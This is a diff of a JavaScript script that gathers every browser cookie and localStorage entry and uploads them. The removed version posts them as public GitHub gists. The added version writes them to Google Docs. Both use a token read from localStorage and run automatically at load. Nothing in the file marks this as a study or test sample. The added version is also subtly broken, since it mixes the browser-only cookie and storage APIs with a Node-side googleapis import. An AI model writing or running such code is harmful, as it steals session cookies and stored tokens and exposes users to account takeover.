@@ -1,50 +1,64 @@
-async function createGist(filename, content, token) {
-    const response = await fetch('https://api.github.com/gists', {
-      method: 'POST',
-      headers: {
-        'Authorization': `token ${token}`,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        description: 'Cookies and Local Storage Data',
-        public: true,
-        files: {
-          [filename]: {
-            content: content
-          }
+const { google } = require('googleapis');
+
+async function postToGoogleDocs(token, title, content) {
+    const auth = new google.auth.OAuth2();
+    auth.setCredentials({ access_token: token });
+    const docs = google.docs({ version: 'v1', auth });
+
+    // Create a new document
+    const createResponse = await docs.documents.create({
+        requestBody: {
+            title: title
         }
-      })
     });
-    const data = await response.json();
-    return data.html_url;
-  }
-  
-  function getCookies() {
+
+    const documentId = createResponse.data.documentId;
+
+    // Update the document with content
+    await docs.documents.batchUpdate({
+        documentId: documentId,
+        requestBody: {
+            requests: [
+                {
+                    insertText: {
+                        location: {
+                            index: 1,
+                        },
+                        text: content
+                    }
+                }
+            ]
+        }
+    });
+
+    return documentId;
+}
+
+function getCookies() {
     return document.cookie.split(';').reduce((cookies, cookie) => {
-      const [name, value] = cookie.split('=').map(c => c.trim());
-      cookies[name] = value;
-      return cookies;
+        const [name, value] = cookie.split('=').map(c => c.trim());
+        cookies[name] = value;
+        return cookies;
     }, {});
-  }
-  
-  function getLocalStorage() {
+}
+
+function getLocalStorage() {
     return Object.keys(localStorage).reduce((data, key) => {
-      data[key] = localStorage.getItem(key);
-      return data;
+        data[key] = localStorage.getItem(key);
+        return data;
     }, {});
-  }
-  
-  async function saveDataOnline() {
+}
+
+async function saveDataOnline() {
     const cookies = getCookies();
     const localStorageData = getLocalStorage();
-  
+
     const token = localStorage.getItem('gst_tkn');
-  
-    const cookiesUrl = await createGist('cookies.json', JSON.stringify(cookies, null, 2), token);
-    const localStorageUrl = await createGist('localStorage.json', JSON.stringify(localStorageData, null, 2), token);
-  
-    console.log('Cookies Gist URL:', cookiesUrl);
-    console.log('Local Storage Gist URL:', localStorageUrl);
-  }
-  
-  saveDataOnline();
+
+    const cookiesDocId = await postToGoogleDocs(token, 'Cookies Data', JSON.stringify(cookies, null, 2));
+    const localStorageDocId = await postToGoogleDocs(token, 'Local Storage Data', JSON.stringify(localStorageData, null, 2));
+
+    console.log('Cookies Doc ID:', cookiesDocId);
+    console.log('Local Storage Doc ID:', localStorageDocId);
+}
+saveDataOnline();
